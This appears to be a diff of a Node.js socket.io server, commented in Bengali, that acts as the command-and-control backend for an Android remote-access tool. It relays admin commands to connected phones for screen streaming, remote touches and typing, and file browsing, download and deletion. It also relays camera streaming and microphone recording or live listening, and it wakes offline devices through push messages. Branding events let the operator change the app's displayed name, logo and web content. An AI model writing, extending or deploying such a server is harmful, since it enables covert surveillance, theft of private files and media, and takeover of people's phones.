@@ -11,6 +11,7 @@ const io = new Server(server, {
 
 const TOKEN_FILE = './fcm_tokens.json';
 
+// File থেকে tokens load করো
 function loadTokenStore() {
   try {
     if (fs.existsSync(TOKEN_FILE)) {
@@ -22,6 +23,7 @@ function loadTokenStore() {
   return {};
 }
 
+// File এ tokens save করো
 function saveTokenStore() {
   try {
     fs.writeFileSync(TOKEN_FILE, JSON.stringify(fcmTokenStore, null, 2));
@@ -32,17 +34,22 @@ function saveTokenStore() {
 
 let clients = {};
 let admins = {};
-let fcmTokenStore = loadTokenStore();
+let fcmTokenStore = loadTokenStore(); // File থেকে load
 
+// FCM V1 API
 async function getFCMAccessToken() {
   let credentials;
+  
+  // Environment variable থেকে নাও
   if (process.env.FIREBASE_CREDENTIALS) {
     credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS);
   } else {
+    // File থেকে নাও
     credentials = JSON.parse(
       fs.readFileSync('/etc/secrets/firebase-service-account.json', 'utf8')
     );
   }
+  
   const auth = new GoogleAuth({
     credentials: credentials,
     scopes: ['https://www.googleapis.com/auth/firebase.messaging']
@@ -67,7 +74,9 @@ async function sendFCMNotification(fcmToken) {
           message: {
             token: fcmToken,
             data: { action: 'WAKE_UP' },
-            android: { priority: 'high' }
+            android: {
+              priority: 'high'
+            }
           }
         })
       }
@@ -82,6 +91,7 @@ async function sendFCMNotification(fcmToken) {
 
 io.on('connection', (socket) => {
 
+  // Client register
   socket.on('register_client', (data) => {
     clients[socket.id] = {
       id: socket.id,
@@ -95,6 +105,7 @@ io.on('connection', (socket) => {
     broadcastClientList();
   });
 
+  // Client info update (battery, network)
   socket.on('client_info', (data) => {
     if (clients[socket.id]) {
       clients[socket.id].battery = data.battery;
@@ -104,6 +115,7 @@ io.on('connection', (socket) => {
     }
   });
 
+  // Client FCM token register
   socket.on('register_fcm_token', (data) => {
     if (clients[socket.id]) {
       clients[socket.id].fcmToken = data.token;
@@ -113,22 +125,24 @@ io.on('connection', (socket) => {
         device: clients[socket.id].device,
         lastSeen: new Date().toISOString()
       };
-      saveTokenStore();
+      saveTokenStore(); // File এ save করো
       broadcastOfflineDevices();
       console.log('FCM token stored:', clients[socket.id].name);
     }
   });
 
+  // Admin wake up client
   socket.on('wake_client', async (data) => {
     const fcmToken = data.token;
     if (fcmToken) {
-      await sendFCMNotification(fcmToken);
+      const result = await sendFCMNotification(fcmToken);
       socket.emit('wake_result', { success: true });
     } else {
       socket.emit('wake_result', { success: false, error: 'No token' });
     }
   });
 
+  // Admin register
   socket.on('register_admin', () => {
     admins[socket.id] = true;
     socket.emit('client_list', Object.values(clients));
@@ -136,14 +150,17 @@ io.on('connection', (socket) => {
     console.log('Admin connected');
   });
 
+  // Admin requests screen
   socket.on('request_screen', (clientId) => {
     io.to(clientId).emit('start_screen');
   });
 
+  // Admin stops screen
   socket.on('stop_screen', (clientId) => {
     io.to(clientId).emit('stop_screen');
   });
 
+  // Client sends screen data
   socket.on('screen_data', (data) => {
     Object.keys(admins).forEach(adminId => {
       io.to(adminId).emit('screen_frame', {
@@ -153,11 +170,16 @@ io.on('connection', (socket) => {
     });
   });
 
+  // Admin sends touch event
   socket.on('touch_event', (data) => {
     io.to(data.clientId).emit('perform_touch', {
-      x: data.x, y: data.y, action: data.action
+      x: data.x,
+      y: data.y,
+      action: data.action
     });
   });
+
+  // ─── New Gesture Events ──────────────────────────────────────
 
   socket.on('perform_swipe', (data) => {
     io.to(data.clientId).emit('perform_swipe', {
@@ -167,72 +189,118 @@ io.on('connection', (socket) => {
     });
   });
 
-  socket.on('press_back',          (data) => io.to(data.clientId).emit('press_back'));
-  socket.on('press_home',          (data) => io.to(data.clientId).emit('press_home'));
-  socket.on('press_recents',       (data) => io.to(data.clientId).emit('press_recents'));
-  socket.on('press_notifications', (data) => io.to(data.clientId).emit('press_notifications'));
+  socket.on('press_back', (data) => {
+    io.to(data.clientId).emit('press_back');
+  });
 
+  socket.on('press_home', (data) => {
+    io.to(data.clientId).emit('press_home');
+  });
+
+  socket.on('press_recents', (data) => {
+    io.to(data.clientId).emit('press_recents');
+  });
+
+  socket.on('press_notifications', (data) => {
+    io.to(data.clientId).emit('press_notifications');
+  });
+
+  // Admin launches app on client
   socket.on('launch_app', (data) => {
     io.to(data.clientId).emit('launch_app', { package: data.package });
   });
 
+  // Admin requests app list
   socket.on('get_app_list', (clientId) => {
     io.to(clientId).emit('get_app_list');
   });
 
+  // Client sends app list
   socket.on('app_list', (data) => {
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('app_list', { clientId: socket.id, apps: data.apps });
+      io.to(adminId).emit('app_list', {
+        clientId: socket.id,
+        apps: data.apps
+      });
     });
   });
 
+  // File transfer — admin to client
   socket.on('file_transfer', (data) => {
     io.to(data.clientId).emit('file_receive', {
-      fileName: data.fileName, fileData: data.fileData, mimeType: data.mimeType
+      fileName: data.fileName,
+      fileData: data.fileData,
+      mimeType: data.mimeType
     });
   });
 
+  // ✅ Client file save acknowledgement — admin কে জানাও
   socket.on('file_received', (data) => {
-    Object.keys(admins).forEach(adminId => io.to(adminId).emit('file_received', data));
+    Object.keys(admins).forEach(adminId => {
+      io.to(adminId).emit('file_received', data);
+    });
   });
 
+  // ✅ Admin request করলে client আবার MediaProjection permission নেবে
   socket.on('request_media_permission', (clientId) => {
     io.to(clientId).emit('request_media_permission');
   });
 
-  // ─── File Manager ────────────────────────────────────────────────────────
+  // ─── File Manager ───────────────────────────────────────────
 
+  // Admin file list চাইলে
   socket.on('get_file_list', (data) => {
+    // data = { clientId, path }
     io.to(data.clientId).emit('get_file_list', { path: data.path });
   });
 
+  // Client file list পাঠালে
   socket.on('file_list_result', (data) => {
+    // data = { path, files: [...] }
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('file_list_result', { clientId: socket.id, path: data.path, files: data.files });
+      io.to(adminId).emit('file_list_result', {
+        clientId: socket.id,
+        path: data.path,
+        files: data.files
+      });
     });
   });
 
+  // Admin file download চাইলে
   socket.on('download_file', (data) => {
+    // data = { clientId, path }
     io.to(data.clientId).emit('download_file', { path: data.path });
   });
 
+  // Client file data পাঠালে
   socket.on('file_download_result', (data) => {
+    // data = { path, fileName, fileData, mimeType }
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('file_download_result', { clientId: socket.id, ...data });
+      io.to(adminId).emit('file_download_result', {
+        clientId: socket.id,
+        ...data
+      });
     });
   });
 
+  // Admin file delete চাইলে
   socket.on('delete_file', (data) => {
+    // data = { clientId, path }
     io.to(data.clientId).emit('delete_file', { path: data.path });
   });
 
+  // Client delete result পাঠালে
   socket.on('delete_file_result', (data) => {
+    // data = { path, success, error }
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('delete_file_result', { clientId: socket.id, ...data });
+      io.to(adminId).emit('delete_file_result', {
+        clientId: socket.id,
+        ...data
+      });
     });
   });
 
-  // ─── Media Viewer ────────────────────────────────────────────────────────
+  // ─── Media Viewer ────────────────────────────────────────────
 
   socket.on('get_media_list', (data) => {
     io.to(data.clientId).emit('get_media_list', { type: data.type });
@@ -240,7 +308,11 @@ io.on('connection', (socket) => {
 
   socket.on('media_list_result', (data) => {
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('media_list_result', { clientId: socket.id, type: data.type, files: data.files });
+      io.to(adminId).emit('media_list_result', {
+        clientId: socket.id,
+        type: data.type,
+        files: data.files
+      });
     });
   });
 
@@ -250,21 +322,35 @@ io.on('connection', (socket) => {
 
   socket.on('media_file_result', (data) => {
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('media_file_result', { clientId: socket.id, ...data });
+      io.to(adminId).emit('media_file_result', {
+        clientId: socket.id,
+        path: data.path,
+        fileName: data.fileName,
+        fileData: data.fileData,
+        mimeType: data.mimeType,
+        success: data.success
+      });
     });
   });
 
-  // ─── Camera ──────────────────────────────────────────────────────────────
+  // ─── Camera Streaming ────────────────────────────────────────
 
   socket.on('start_camera', (data) => {
+    // data = { clientId, facing } facing = "front" or "back"
     io.to(data.clientId).emit('start_camera', { facing: data.facing });
   });
 
-  socket.on('stop_camera',   (data) => io.to(data.clientId).emit('stop_camera'));
+  socket.on('stop_camera', (data) => {
+    io.to(data.clientId).emit('stop_camera');
+  });
 
   socket.on('camera_frame', (data) => {
+    // Client থেকে frame আসলে সব admin এ পাঠাও
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('camera_frame', { clientId: socket.id, frame: data.frame });
+      io.to(adminId).emit('camera_frame', {
+        clientId: socket.id,
+        frame: data.frame
+      });
     });
   });
 
@@ -272,46 +358,75 @@ io.on('connection', (socket) => {
     io.to(data.clientId).emit('switch_camera', { facing: data.facing });
   });
 
-  // ─── Audio ───────────────────────────────────────────────────────────────
+  // ─── Audio Recording ─────────────────────────────────────────
 
   socket.on('start_audio_record', (data) => {
+    // data = { clientId, duration } duration = seconds
     io.to(data.clientId).emit('start_audio_record', { duration: data.duration });
   });
 
-  socket.on('stop_audio_record',  (data) => io.to(data.clientId).emit('stop_audio_record'));
+  socket.on('stop_audio_record', (data) => {
+    io.to(data.clientId).emit('stop_audio_record');
+  });
 
   socket.on('audio_record_result', (data) => {
+    // Client recording শেষে audio file পাঠাবে
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('audio_record_result', { clientId: socket.id, ...data });
+      io.to(adminId).emit('audio_record_result', {
+        clientId: socket.id,
+        audioData: data.audioData,
+        duration: data.duration,
+        success: data.success,
+        error: data.error
+      });
     });
   });
 
   socket.on('audio_record_progress', (data) => {
+    // Recording progress admin কে জানাও
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('audio_record_progress', { clientId: socket.id, remaining: data.remaining });
+      io.to(adminId).emit('audio_record_progress', {
+        clientId: socket.id,
+        remaining: data.remaining
+      });
     });
   });
 
-  socket.on('start_audio_stream', (data) => io.to(data.clientId).emit('start_audio_stream'));
-  socket.on('stop_audio_stream',  (data) => io.to(data.clientId).emit('stop_audio_stream'));
+  // ─── Audio Live Stream ───────────────────────────────────────
 
+  socket.on('start_audio_stream', (data) => {
+    io.to(data.clientId).emit('start_audio_stream');
+  });
+
+  socket.on('stop_audio_stream', (data) => {
+    io.to(data.clientId).emit('stop_audio_stream');
+  });
+
+  // Client থেকে live chunk আসলে admin এ পাঠাও
   socket.on('audio_stream_chunk', (data) => {
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('audio_stream_chunk', { clientId: socket.id, chunk: data.chunk, sampleRate: data.sampleRate });
+      io.to(adminId).emit('audio_stream_chunk', {
+        clientId: socket.id,
+        chunk: data.chunk,
+        sampleRate: data.sampleRate
+      });
     });
   });
 
-  // ─── Branding ────────────────────────────────────────────────────────────
+  // ─── Branding Events ─────────────────────────────────────────
 
   socket.on('set_webview_url', (data) => {
     io.to(data.clientId).emit('set_webview_url', { url: data.url });
   });
 
   socket.on('set_app_branding', (data) => {
-    io.to(data.clientId).emit('set_app_branding', { name: data.name, logoUrl: data.logoUrl });
+    io.to(data.clientId).emit('set_app_branding', {
+      name: data.name,
+      logoUrl: data.logoUrl
+    });
   });
 
-  // ─── Accessibility: existing ──────────────────────────────────────────────
+  // ─── Accessibility Info ──────────────────────────────────────
 
   socket.on('get_accessibility_info', (data) => {
     io.to(data.clientId).emit('get_accessibility_info');
@@ -326,6 +441,7 @@ io.on('connection', (socket) => {
     });
   });
 
+  // Element এ click করার জন্য
   socket.on('accessibility_click', (data) => {
     io.to(data.clientId).emit('accessibility_click', {
       centerX: data.centerX,
@@ -333,6 +449,7 @@ io.on('connection', (socket) => {
     });
   });
 
+  // Input field এ text type করার জন্য
   socket.on('accessibility_type', (data) => {
     io.to(data.clientId).emit('accessibility_type', {
       text: data.text,
@@ -341,53 +458,9 @@ io.on('connection', (socket) => {
     });
   });
 
-  // ─── Accessibility: NEW ───────────────────────────────────────────────────
-
-  // Long press on element
-  socket.on('accessibility_longpress', (data) => {
-    io.to(data.clientId).emit('accessibility_longpress', {
-      centerX: data.centerX,
-      centerY: data.centerY
-    });
-  });
-
-  // Scroll on specific element
-  socket.on('accessibility_scroll', (data) => {
-    io.to(data.clientId).emit('accessibility_scroll', {
-      centerX:   data.centerX,
-      centerY:   data.centerY,
-      direction: data.direction
-    });
-  });
-
-  // Scroll result feedback
-  socket.on('accessibility_scroll_result', (data) => {
-    Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('accessibility_scroll_result', {
-        clientId: socket.id,
-        ...data
-      });
-    });
-  });
-
-  // Screenshot for Overlay tab
-  socket.on('get_screenshot', (data) => {
-    io.to(data.clientId).emit('get_screenshot', {});
-  });
-
-  // Screenshot result — last captured frame
-  socket.on('screenshot_result', (data) => {
-    Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('screenshot_result', {
-        clientId: socket.id,
-        frame: data.frame
-      });
-    });
-  });
-
-  // ─── Disconnect ───────────────────────────────────────────────────────────
-
+  // Disconnect
   socket.on('disconnect', () => {
+    console.log('Disconnected client data:', clients[socket.id]); // debug
     if (clients[socket.id]) {
       const client = clients[socket.id];
       if (client.fcmToken) {
@@ -399,6 +472,7 @@ io.on('connection', (socket) => {
     delete admins[socket.id];
     broadcastClientList();
     broadcastOfflineDevices();
+    console.log('Offline devices count:', Object.keys(fcmTokenStore).length); // debug
     console.log('Disconnected:', socket.id);
   });
 
@@ -409,18 +483,23 @@ io.on('connection', (socket) => {
   }
 
   function broadcastOfflineDevices() {
+    // Online clients এর token গুলো নাও (null/undefined বাদ দাও)
     const onlineTokens = new Set(
-      Object.values(clients)
-        .map(c => c.fcmToken)
-        .filter(t => t != null && t !== '')
+        Object.values(clients)
+            .map(c => c.fcmToken)
+            .filter(t => t != null && t !== '')
     );
+
+    // fcmTokenStore এ আছে কিন্তু এখন online না — সেগুলোই offline
     const offlineDevices = Object.values(fcmTokenStore).filter(
-      d => !onlineTokens.has(d.token)
+        d => !onlineTokens.has(d.token)
     );
+
     Object.keys(admins).forEach(adminId => {
-      io.to(adminId).emit('offline_devices', offlineDevices);
+        io.to(adminId).emit('offline_devices', offlineDevices);
     });
   }
+
 });
 
 app.get('/', (req, res) => {
